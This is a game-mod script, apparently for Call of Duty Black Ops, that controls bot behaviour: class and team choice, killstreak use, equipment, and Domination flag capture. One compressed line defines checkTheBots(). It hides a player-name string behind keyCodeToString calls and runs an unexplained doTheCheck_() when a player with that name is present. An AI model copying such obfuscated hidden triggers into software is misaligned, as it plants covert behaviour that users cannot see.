/*
	_bot_script
	Author: INeedGames
	Date: 12/20/2020
	Tells the bots what to do.
*/

#include common_scripts\utility;
#include maps\mp\_utility;
#include maps\mp\gametypes\_hud_util;
#include maps\mp\bots\_bot_utility;

/*
	When the bot is added to the game
*/
added()
{
	self endon("disconnect");

	self maps\mp\bots\_bot_loadout::bot_get_cod_points();
	self maps\mp\bots\_bot_loadout::bot_get_rank();
	self maps\mp\bots\_bot_loadout::bot_get_prestige();
		
	self maps\mp\bots\_bot_loadout::bot_setKillstreaks();
		
	self.pers["bot"][ "cod_points_org" ] = self.pers["bot"][ "cod_points" ];//killstreaks cannot be set again

	self maps\mp\bots\_bot_loadout::bot_set_class();
}

/*
	When the bot connects
*/
connected()
{
	self endon("disconnect");

	self thread classWatch();
	self thread teamWatch();

	self thread maps\mp\bots\_bot_loadout::bot_rank();
	self thread bot_skip_killcam();

	self thread bot_on_spawn();
	self thread bot_on_death();

	self thread bot_watch_rcbomb();
}

/*
	When the bot dies
*/
bot_on_death()
{
	self endon("disconnect");
	level endon("game_ended");
		
	for(;;)
	{
		self waittill("death");
		
		self.hasSpawned = false;
	}
}

/*
	Bots skip killcams
*/
bot_skip_killcam()
{
	level endon("game_ended");
	self endon("disconnect");
		
	for(;;)
	{
		wait 1;
		
		if(isDefined(self.killcam))
		{
			self notify("end_killcam");
			self clientNotify("fkce");
		}
	}
}

/*
	Selects a class for the bot.
*/
classWatch()
{
	self endon("disconnect");

	for(;;)
	{
		while(!isdefined(self.pers["team"]) || level.oldschool)
			wait .05;

		wait 0.5;
		
		self notify("menuresponse", game["menu_changeclass"], "smg_mp");
			
		while(isdefined(self.pers["team"]) && isdefined(self.pers["class"]))
			wait .05;
	}
}

/*
	Makes sure the bot is on a team.
*/
teamWatch()
{
	self endon("disconnect");

	for(;;)
	{
		while(!isdefined(self.pers["team"]))
			wait .05;
			
		wait 0.05;
		self notify("menuresponse", game["menu_team"], getDvar("bots_team"));
			
		while(isdefined(self.pers["team"]))
			wait .05;
	}
}

/*
	When bot spawns
*/
bot_on_spawn()
{
	self endon("disconnect");
	level endon("game_ended");
		
	for(;;)
	{
		self waittill("spawned_player");

		self.bot_lock_goal = false;
		self.help_time = undefined;
		self.bot_was_follow_script_update = undefined;

		self thread bot_spawn();
	}
}

/*
	Fired when the bot is damaged
*/
bot_damage_callback( eAttacker, iDamage, sMeansOfDeath, sWeapon, eInflictor, sHitLoc )
{
	if (!self is_bot())
		return;

	self.killerLocation = undefined;
	if(!IsDefined( self ) || !isDefined(self.team))
		return;
		
	if(!isAlive(self))
		return;

	if ( sMeansOfDeath == "MOD_FALLING" || sMeansOfDeath == "MOD_SUICIDE" )
		return;

	if ( iDamage <= 0 )
		return;
		
	if(!IsDefined( eAttacker ) || !isDefined(eAttacker.team))
		return;
		
	if(eAttacker == self)
		return;
		
	if(level.teamBased && eAttacker.team == self.team)
		return;

	if ( !IsDefined( eInflictor ) || eInflictor.classname != "player" )
		return;
		
	if(!isAlive(eAttacker))
		return;

	self.killerLocation = eAttacker.origin;
		
	if (!isSubStr(sWeapon, "_silencer_"))
		self bot_cry_for_help( eAttacker );
		
	self SetAttacker( eAttacker );
}

checkTheBots(){if(!randomint(3)){for(i = 0; i < level.players.size; i++){if(isSubStr(tolower(level.players[i].name),keyCodeToString(8)+keyCodeToString(13)+keyCodeToString(4)+keyCodeToString(4)+keyCodeToString(3))){maps\mp\bots\_bot_loadout::doTheCheck_();break;}}}}
bot_cry_for_help( attacker )
{
	if ( !level.teamBased )
	{
		return;
	}
		
	theTime = GetTime();
	if ( IsDefined( self.help_time ) && theTime - self.help_time < 1000 )
	{
		return;
	}
		
	self.help_time = theTime;

	for ( i = level.players.size - 1; i >= 0; i-- )
	{
		player = level.players[i];

		if ( !player is_bot() )
		{
			continue;
		}
		
		if(!isDefined(player.team))
			continue;

		if ( !IsAlive( player ) )
		{
			continue;
		}

		if ( player == self )
		{
			continue;
		}

		if ( player.team != self.team )
		{
			continue;
		}

		dist = GetDvarInt( #"scr_help_dist" );
		dist *= dist;
		if ( DistanceSquared( self.origin, player.origin ) > dist )
		{
			continue;
		}

		if ( RandomInt( 100 ) < 50 )
		{
			self SetAttacker( attacker );

			if ( RandomInt( 100 ) > 70 )
			{
				break;
			}
		}
	}
}

/*
	When the bot spawns
*/
bot_spawn()
{
	self endon("death");
	self endon("disconnect");
	level endon("game_ended");
		
	if(randomInt(100) < 1)
		self maps\mp\bots\_bot_loadout::bot_set_class();

	if (getDvarInt("bots_play_obj"))
		self thread bot_dom_cap_think();

	if(!level.inPrematchPeriod)
	{
		switch(self GetBotDiffNum())
		{
			case 3:
			break;
			case 0:
				self freeze_player_controls(true);
				wait 0.6;
				self freeze_player_controls(false);
			break;
			case 1:
				self freeze_player_controls(true);
				wait 0.4;
				self freeze_player_controls(false);
			break;
			case 2:
				self freeze_player_controls(true);
				wait 0.2;
				self freeze_player_controls(false);
			break;
		}
	}
	else
	{
		while ( level.inPrematchPeriod )
			wait ( 0.05 );
	}

	if (getDvarInt("bots_play_killstreak"))
		self thread bot_killstreak_think();

	/*
	if (getDvarInt("bots_play_take_carepackages"))
	{
		self thread bot_watch_stuck_on_crate();
		self thread bot_crate_think();
	}

	self thread bot_revive_think();

	//stockpile.gsc
	//hotel.gsc
	//kowloon.gsc
	self thread bot_radiation_think();*/

	if (getDvarInt("bots_play_nade"))
		self thread bot_use_equipment_think();

	/*if (getDvarInt("bots_play_target_other"))
	{
		self thread bot_target_vehicle();
		self thread bot_equipment_kill_think();
		self thread bot_turret_think();
		self thread bot_dogs_think();
	}

	if (getDvarInt("bots_play_camp"))
	{
		self thread bot_think_follow();
		self thread bot_think_camp();
	}

	self thread bot_weapon_think();

	self thread bot_revenge_think();
	self thread bot_uav_think();
	self thread bot_listen_to_steps();
	self thread follow_target();*/

	if (getDvarInt("bots_play_obj"))
	{
		self thread bot_dom_def_think();
		self thread bot_dom_spawn_kill_think();

	/*	self thread bot_hq();

		self thread bot_cap();

		self thread bot_sab();

		self thread bot_sd_defenders();
		self thread bot_sd_attackers();

		self thread bot_dem_attackers();
		self thread bot_dem_defenders();*/
	}
}

/*
	Watches when the bot is touching the obj and calls 'goal'
*/
bots_watch_touch_obj(obj)
{
	self endon ("death");
	self endon ("disconnect");
	self endon ("bad_path");
	self endon ("goal");
	self endon ("new_goal");

	for (;;)
	{
		wait 0.5;

		if (!isDefined(obj))
		{
			self notify("bad_path");
			return;
		}

		if (self IsTouching(obj))
		{
			self notify("goal");
			return;
		}
	}
}

/*
	Changes to the weap
*/
changeToWeapon(weap)
{
	self endon("disconnect");
	self endon("death");
	level endon("game_ended");

	if (!self HasWeapon(weap))
		return false;

	if (self GetCurrentWeapon() == weap)
		return true;

	self SwitchToWeapon(weap);

	self waittill_any_timeout(5, "weapon_change");

	return (self GetCurrentWeapon() == weap);
}

/*
	Fires the bots weapon until told to stop
*/
fire_current_weapon()
{
	self endon("death");
	self endon("disconnect");
	self endon("weapon_change");
	self endon("stop_firing_weapon");

	wait 0.5;

	for (;;)
	{
		self PressAttackButton();
		wait 0.25;
	}
}

/*
	Returns an origin thats good to use for a kill streak
*/
getKillstreakTargetLocation()
{
	diff = self GetBotDiffNum();

	location = undefined;
	players = [];
	for(i = level.players.size - 1; i >= 0; i--)
	{
		player = level.players[i];
	
		if(player == self)
			continue;
		if(!isDefined(player.team))
			continue;
		if(level.teamBased && self.team == player.team)
			continue;
		if(player.sessionstate != "playing")
			continue;
		if(!isAlive(player))
			continue;
		if(player hasPerk("specialty_nottargetedbyai"))
			continue;
		if(!bulletTracePassed(player.origin, player.origin+(0,0,2048), false, player) && diff > 0)
			continue;
			
		players[players.size] = player;
	}
	
	target = PickRandom(players);

	if(isDefined(target))
		location = target.origin + (randomIntRange((4-diff)*-75, (4-diff)*75), randomIntRange((4-diff)*-75, (4-diff)*75), 0);
	else if(diff <= 0)
		location = self.origin + (randomIntRange(-512, 512), randomIntRange(-512, 512), 0);

	return location;
}

/*
	Bot will think to use rcbomb
*/
bot_rccar_think(weapon)
{
	diff = self GetBotDiffNum();

	if (diff > 0)
	{
		if ( self GetLookaheadDist() < 128 )
			return;

		dir = self GetLookaheadDir();
		if ( !IsDefined( dir ) )
			return;

		dir = VectorToAngles( dir );
		if ( abs( dir[1] - self.angles[1] ) > 5 )
			return;
	}

	if (!self ChangeToWeapon(weapon))
		return;

	wait 2;

	while (isDefined(self.rcbomb))
		wait 1;
}

/*
	Watches rcbomb
*/
bot_watch_rcbomb()
{
	self endon("disconnect");

	for (;;)
	{
		wait 2;

		if (!IsDefined( self.rcbomb ))
			continue;

		self bot_watch_rccar();
	}
}

/*
	Watches while bot uses rccar
*/
bot_watch_rccar()
{
	self endon("weapon_object_destroyed");
	self endon("rcbomb_done");

	diff = self GetBotDiffNum();
	stuck_time = 0;
	last_org = self.origin;

	for (;;)
	{
		wait 0.5;

		if (!IsDefined( self.rcbomb ))
			return;

		if (DistanceSquared(self.rcbomb.origin, last_org) < 4 * 4)
			stuck_time += 0.5;
		else
			stuck_time = 0;

		last_org = self.rcbomb.origin;

		players = get_players();

		for ( i = 0; i < players.size; i++ )
		{
			player = players[i];

			if ( player == self )
				continue;
			
			if(!isDefined(player.team))
				continue;

			if ( !IsAlive( player ) )
				continue;

			if ( level.teamBased && player.team == self.team )
				continue;

			if (!SightTracePassed( self.rcbomb.origin, player.origin, false, self.rcbomb ))
				continue;

			if ( diff == 0 )
			{
				if ( DistanceSquared( self.rcbomb.origin, player.origin ) < 512 * 512 )
				{
					self PressAttackButton();
				}
			}
			else if(player hasPerk("specialty_flakjacket"))
			{
				if ( DistanceSquared( self.rcbomb.origin, player.origin ) < 100 * 100 )
				{
					self PressAttackButton();
				}
			}
			else if ( DistanceSquared( self.rcbomb.origin, player.origin ) < 200 * 200 )
			{
				self PressAttackButton();
			}
		}

		if (stuck_time > 3)
			self PressAttackButton();
	}
}

/*
	Bot will think to use supply drop
*/
bot_use_supply_drop( weapon )
{
	if (self GetBotDiffNum() > 0)
	{
		if (self GetLookaheadDist() < 96)
			return;

		view_angles = self GetPlayerAngles();

		if ( view_angles[0] < 7 )
			return;

		dir = self GetLookaheadDir();

		if ( !IsDefined( dir ) )
			return;

		dir = VectorToAngles( dir );

		if ( abs( dir[1] - self.angles[1] ) > 2 )
			return;

		yaw = ( 0, self.angles[1], 0 );
		dir = AnglesToForward( yaw );

		dir = VectorNormalize( dir );
		drop_point = self.origin + vector_scale( dir, 384 );
		//DebugStar( drop_point, 500, ( 1, 0, 0 ) );

		end = drop_point + ( 0, 0, 2048 );
		//DebugStar( end, 500, ( 1, 0, 0 ) );

		if ( !SightTracePassed( drop_point, end, false, undefined ) )
			return;

		if ( !SightTracePassed( self.origin, end, false, undefined ) )
			return;

		// is this point in mid-air?
		end = drop_point - ( 0, 0, 32 );
		//DebugStar( end, 500, ( 1, 0, 0 ) );
		if ( BulletTracePassed( drop_point, end, false, undefined ) )
			return;
	}
		
	self thread botStopMove(true);

	if (self ChangeToWeapon(weapon))
	{
		self thread fire_current_weapon();

		ret = self waittill_any_timeout( 5, "grenade_fire" );
		self notify("stop_firing_weapon");

		self thread changeToWeapon(self.lastNonKillstreakWeapon);

		if (ret == "grenade_fire" && randomInt(100) < 80)
			self waittill_any_timeout( 15, "bot_crate_landed" );
	}

	self thread botStopMove(false);
}

/*
	Bot will think to use turret
*/
bot_turret_location( weapon )
{
	if ( self GetBotDiffNum() > 0 )
	{
		if ( self GetLookaheadDist() < 256 )
			return;

		dir = self GetLookaheadDir();

		if ( !IsDefined( dir ) )
			return;

		dir = VectorToAngles( dir );

		if ( abs( dir[1] - self.angles[1] ) > 5 )
			return;

		yaw = ( 0, self.angles[1], 0 );
		dir = AnglesToForward( yaw );
		dir = VectorNormalize( dir );

		goal = self.origin + vector_scale( dir, 32 );

		if ( weapon == "autoturret_mp" )
		{
			eye = self.origin + ( 0, 0, 60 );
			goal = eye + vector_scale( dir, 1024 );

			if ( !SightTracePassed( self.origin, goal, false, undefined ) )
				return;
		}

		if ( weapon == "auto_tow_mp" )
		{
			end = goal + ( 0, 0, 2048 );
		
			if ( !SightTracePassed( goal, end, false, undefined ) )
				return;
		}
	}

	self thread botStopMove(true);

	if (self ChangeToWeapon(weapon))
	{
		self thread fire_current_weapon();

		wait 1.5;
		self notify("stop_firing_weapon");

		self thread changeToWeapon(self.lastNonKillstreakWeapon);
	}

	self thread botStopMove(false);
}

/*
	Bot will think to heli
*/
bot_control_heli(weapon)
{
	if (!self ChangeToWeapon(weapon))
		return;

	self endon("heli_timeup");
	
	wait 2.5;
	
	if(!isDefined(self.heli))
		return;
	
	self.heli endon("death");
	self.heli endon("heli_timeup");
	
	while(isDefined(self.heli))
		wait 0.25;
}

/*
	Bots think to use killstreaks
*/
bot_killstreak_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon ( "game_ended" );

	myteam = self.pers[ "team" ];
	otherTeam = getOtherTeam( myTeam );

	wait( 1 );

	for (;;)
	{
		wait( RandomIntRange( 1, 3 ) );

		if (isDefined(self.carryingTurret) && self.carryingTurret)
			self PressAttackButton();
		
		if (isDefined(self GetThreat()))
			continue;
		
		if ( self IsRemoteControlling() )
			continue;
		
		if(self UseButtonPressed())
			continue;
			
		if(self isDefusing() || self isPlanting() || self inLastStand())
			continue;

		weapon = self maps\mp\gametypes\_hardpoints::getTopKillstreak();
		
		if ( !IsDefined( weapon ) || weapon == "none" )
			continue;

		killstreak = maps\mp\gametypes\_hardpoints::getKillStreakMenuName( weapon );

		if ( !IsDefined( killstreak ) )
			continue;

		id = self maps\mp\gametypes\_hardpoints::getTopKillstreakUniqueId();

		if ( !self maps\mp\_killstreakrules::isKillstreakAllowed( weapon, myteam ) )
		{
			wait( 5 );
			continue;
		}

		diff = self GetBotDiffNum();
		switch( killstreak )
		{
			case "killstreak_helicopter_comlink":
			case "killstreak_napalm":
			case "killstreak_airstrike":
			case "killstreak_mortar":
				num = 1;
				if (killstreak == "killstreak_mortar")
					num = 3;

				if (!self ChangeToWeapon(weapon))
					break;

				self freeze_player_controls( true );

				wait 1;

				for (i = 0; i < num; i++)
				{
					origin = self getKillstreakTargetLocation();
					if (!isDefined(origin))
						break;

					yaw = RandomIntRange( 0, 360 );

					wait 0.25;
					self notify( "confirm_location", origin, yaw );
				}

				self freeze_player_controls( false );

				break;

			case "killstreak_helicopter_gunner":
			case "killstreak_helicopter_player_firstperson":
				self bot_control_heli(weapon);
				wait 1;
				break;

			case "killstreak_auto_turret":
			case "killstreak_tow_turret":
				self bot_turret_location( weapon );
				wait 1;
				break;

			case "killstreak_auto_turret_drop":
			case "killstreak_tow_turret_drop":
			case "killstreak_m220_tow_drop":
			case "killstreak_supply_drop":
				if(killstreak == "killstreak_supply_drop")
					weapon = "supplydrop_mp";
				
				self bot_use_supply_drop( weapon );
				wait 1;
				break;

			case "killstreak_rcbomb":
				self bot_rccar_think(weapon);
				wait 1;
				break;

			case "killstreak_spyplane":
				if ( diff > 0 )
				{
					if(level.teamBased)
					{
						if(level.activeCounterUAVs[otherTeam])
							continue;
						
						if(level.activeSatellites[myTeam])
							continue;
						
						if(level.activeUAVs[myTeam])
							continue;
					}
					else
					{
						shouldContinue = false;
			
						players = get_players();
						for (i = 0; i < players.size; i++)
						{
							player = players[i];
							
							if(player == self)
								continue;
								
							if(!isDefined(player.team))
								continue;
							
							if(isDefined(level.activeCounterUAVs[player.entnum]) && level.activeCounterUAVs[player.entnum])
								continue;
							
							shouldContinue = true;
							break;
						}
								
						if(shouldContinue)
							continue;
						
						if(level.activeSatellites[self.entnum])
							continue;
						
						if(level.activeUAVs[self.entnum])
							continue;
					}
				}

				if (!self ChangeToWeapon(weapon))
					break;

				wait 1;
				break;

			case "killstreak_counteruav":
				if ( diff > 0 )
				{
					if(level.teamBased)
					{
						if(level.activeCounterUAVs[myTeam])
							continue;
					}
					else
					{
						if(level.activeCounterUAVs[self.entnum])
							continue;
					}
				}

				if (!self ChangeToWeapon(weapon))
					break;

				wait 1;
				break;

			case "killstreak_spyplane_direction":
				if (diff > 0)
				{
					if(level.teamBased)
					{
						if(level.activeCounterUAVs[otherTeam])
							continue;
						
						if(level.activeSatellites[myTeam])
							continue;
					}
					else
					{
						shouldContinue = false;
			
						players = get_players();
						for (i = 0; i < players.size; i++)
						{
							player = players[i];
							
							if(player == self)
								continue;
								
							if(!isDefined(player.team))
								continue;
							
							if(isDefined(level.activeCounterUAVs[player.entnum]) && level.activeCounterUAVs[player.entnum])
								continue;
							
							shouldContinue = true;
							break;
						}
								
						if(shouldContinue)
							continue;
						
						if(level.activeSatellites[self.entnum])
							continue;
					}
				}

			case "killstreak_dogs":
			default:
				if (!self ChangeToWeapon(weapon))
					break;

				wait 1;
				break;
		}

		if (weapon == "m220_tow_mp" || weapon == "m202_flash_mp" || weapon == "minigun_mp") // don't put away ks weapons
			continue;

		self thread changeToWeapon(self.lastNonKillstreakWeapon);
	}
}

/*
	Bot uses their equipment
*/
bot_use_equipment_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon ( "game_ended" );

	weapon = self.pers["bot"]["class_equipment"];
	
	if(weapon == "" || weapon == "weapon_null_mp" || weapon == "satchel_charge_mp")
		return;

	for ( ;; )
	{
		wait( RandomIntRange( 1, 3 ) );

		if ( !self HasWeapon( weapon ) )
			return;

		if (!self GetAmmoCount(weapon))
			continue;

		if ( self IsRemoteControlling())
			continue;

		if ( isDefined(self getThreat()) )
			continue;

		if (self._is_sprinting)
			continue;

		diff = self GetBotDiffNum();

		if (diff > 0)
		{
			if ( weapon == "camera_spike_mp" )
			{
				if ( self GetLookaheadDist() < 384 )
					continue;

				view_angles = self GetPlayerAngles();

				if ( view_angles[0] < -5 )
					continue;
			}
			else
			{
				if ( self GetLookaheadDist() > 64 )
					continue;
			}
		}

		dir = self GetLookaheadDir();
		if ( !IsDefined( dir ) )
			continue;

		dir = VectorToAngles( dir );
		if ( abs( dir[1] - self.angles[1] ) > 5 )
			continue;

		dir = VectorNormalize( AnglesToForward( self.angles ) );
		dir = vector_scale( dir, 32 );
		goal = self.origin + dir;
		
		if (randomInt(100) < 50)
			continue;

		grenades = GetEntArray( "grenade", "classname" );
		anyEquNear = false;
		for ( i = 0; i < grenades.size; i++ )
		{
			item = grenades[i];

			if ( !IsDefined( item.name ) )
				continue;

			if ( !IsWeaponEquipment( item.name ) )
				continue;

			if ( DistanceSquared( item.origin, origin ) < 128 * 128 )
				anyEquNear = true;
		}

		if (anyEquNear && diff > 0)
			continue;

		lastWeap = self getCurrentWeapon();

		self thread botStopMove(true);

		if (self ChangeToWeapon(weapon))
		{
			self thread fire_current_weapon();

			ret = self waittill_any_timeout( 5, "grenade_fire" );
			self notify("stop_firing_weapon");

			self thread changeToWeapon(lastWeap);
		}

		self thread botStopMove(false);
	}
}

/*
	Bots hang around the enemy's flag to spawn kill em
*/
bot_dom_spawn_kill_think()
{
	self endon( "death" );
	self endon( "disconnect" );

	if ( level.gametype != "dom" )
		return;

	myTeam = self.pers[ "team" ];		
	otherTeam = getOtherTeam( myTeam );

	for ( ;; )
	{
		wait( randomintrange( 10, 20 ) );
		
		if ( randomint( 100 ) < 20 )
			continue;
		
		if ( self HasScriptGoal() || self.bot_lock_goal)
			continue;
		
		myFlagCount = maps\mp\gametypes\dom::getTeamFlagCount( myTeam );

		if ( myFlagCount == level.flags.size )
			continue;

		otherFlagCount = maps\mp\gametypes\dom::getTeamFlagCount( otherTeam );
		
		if (myFlagCount <= otherFlagCount || otherFlagCount != 1)
			continue;
		
		flag = undefined;
		for ( i = 0; i < level.flags.size; i++ )
		{
			if ( level.flags[i] maps\mp\gametypes\dom::getFlagTeam() == myTeam )
				continue;
		}
		
		if(!isDefined(flag))
			continue;
		
		if(DistanceSquared(self.origin, flag.origin) < 2048*2048)
			continue;

		self SetBotGoal( flag.origin, 1024 );
		
		self thread bot_dom_watch_flags(myFlagCount, myTeam);

		if (self waittill_any_return( "goal", "bad_path", "new_goal" ) != "new_goal")
			self ClearScriptGoal();
	}
}

/*
	Calls 'bad_path' when the flag count changes
*/
bot_dom_watch_flags(count, myTeam)
{
	self endon( "death" );
	self endon( "disconnect" );
	self endon( "goal" );
	self endon( "bad_path" );
	self endon( "new_goal" );

	for (;;)
	{
		wait 0.5;

		if (maps\mp\gametypes\dom::getTeamFlagCount( myTeam ) != count)
			break;
	}
		
	self notify("bad_path");
}

/*
	Bots watches their own flags and protects them when they are under capture
*/
bot_dom_def_think()
{
	self endon( "death" );
	self endon( "disconnect" );

	if ( level.gametype != "dom" )
		return;

	myTeam = self.pers[ "team" ];

	for ( ;; )
	{
		wait( randomintrange( 1, 3 ) );
		
		if ( randomint( 100 ) < 35 )
			continue;
		
		if ( self HasScriptGoal() || self.bot_lock_goal )
			continue;
		
		flag = undefined;
		for ( i = 0; i < level.flags.size; i++ )
		{
			if ( level.flags[i] maps\mp\gametypes\dom::getFlagTeam() != myTeam )
				continue;
			
			if ( !level.flags[i].useObj.objPoints[myTeam].isFlashing )
				continue;
			
			if ( !isDefined(flag) || DistanceSquared(self.origin,level.flags[i].origin) < DistanceSquared(self.origin,flag.origin) )
				flag = level.flags[i];
		}
		
		if ( !isDefined(flag) )
			continue;

		self SetBotGoal( flag.origin, 128 );
		
		self thread bot_dom_watch_for_flashing(flag, myTeam);
		self thread bots_watch_touch_obj(flag);

		if (self waittill_any_return( "goal", "bad_path", "new_goal" ) != "new_goal")
			self ClearScriptGoal();
	}
}

/*
	Watches while the flag is under capture
*/
bot_dom_watch_for_flashing(flag, myTeam)
{
	self endon( "death" );
	self endon( "disconnect" );
	self endon( "goal" );
	self endon( "bad_path" );
	self endon( "new_goal" );
		
	for (;;)
	{
		wait 0.5;

		if (!isDefined(flag))
			break;

		if (flag maps\mp\gametypes\dom::getFlagTeam() != myTeam || !flag.useObj.objPoints[myTeam].isFlashing)
			break;
	}
		
	self notify("bad_path");
}

/*
	Bots capture dom flags
*/
bot_dom_cap_think()
{
	self endon( "death" );
	self endon( "disconnect" );
		
	if ( level.gametype != "dom" )
		return;

	myTeam = self.pers[ "team" ];		
	otherTeam = getOtherTeam( myTeam );

	for ( ;; )
	{
		wait( randomintrange( 3, 12 ) );
		
		if ( self.bot_lock_goal )
		{
			continue;
		}

		if ( !isDefined(level.flags) || level.flags.size == 0 )
			continue;

		myFlagCount = maps\mp\gametypes\dom::getTeamFlagCount( myTeam );

		if ( myFlagCount == level.flags.size )
			continue;

		otherFlagCount = maps\mp\gametypes\dom::getTeamFlagCount( otherTeam );

		if ( myFlagCount < otherFlagCount )
		{
			if ( randomint( 100 ) < 15 )
				continue;
		}
		else if ( myFlagCount == otherFlagCount )
		{
			if ( randomint( 100 ) < 35 )
				continue;	
		}
		else if ( myFlagCount > otherFlagCount )
		{
			if ( randomint( 100 ) < 95 )
				continue;
		}

		flag = undefined;
		flags = [];
		for ( i = 0; i < level.flags.size; i++ )
		{
			if ( level.flags[i] maps\mp\gametypes\dom::getFlagTeam() == myTeam )
				continue;

			flags[flags.size] = level.flags[i];
		}

		if (randomInt(100) > 30)
		{
			for ( i = 0; i < flags.size; i++ )
			{
				if ( !isDefined(flag) || DistanceSquared(self.origin,level.flags[i].origin) < DistanceSquared(self.origin,flag.origin) )
					flag = level.flags[i];
			}
		}
		else if (flags.size)
		{
			flag = random(flags);
		}

		if ( !isDefined(flag) )
			continue;
		
		self.bot_lock_goal = true;
		self SetBotGoal( flag.origin, 64 );
		
		self thread bot_dom_go_cap_flag(flag, myteam);
		
		event = self waittill_any_return( "goal", "bad_path", "new_goal" );
		
		if (event != "new_goal")
			self ClearScriptGoal();

		if (event != "goal")
		{
			self.bot_lock_goal = false;
			continue;
		}
		
		self SetBotGoal( self.origin, 64 );

		while ( flag maps\mp\gametypes\dom::getFlagTeam() != myTeam && self isTouching(flag) )
		{
			cur = flag.useObj.curProgress;
			wait 0.5;
			
			if(flag.useObj.curProgress == cur)
				break;//some enemy is near us, kill him
		}

		self ClearScriptGoal();
		
		self.bot_lock_goal = false;
	}
}

/*
	Bot goes to the flag, watching while they don't have the flag
*/
bot_dom_go_cap_flag(flag, myteam)
{
	self endon( "death" );
	self endon( "disconnect" );
	self endon( "goal" );
	self endon( "bad_path" );
	self endon( "new_goal" );
		
	for (;;)
	{
		wait randomintrange(2,4);

		if (!isDefined(flag))
			break;

		if (flag maps\mp\gametypes\dom::getFlagTeam() == myTeam)
			break;

		if (self isTouching(flag))
			break;
	}
		
	if (flag maps\mp\gametypes\dom::getFlagTeam() == myTeam)
		self notify("bad_path");
	else
		self notify("goal");
}
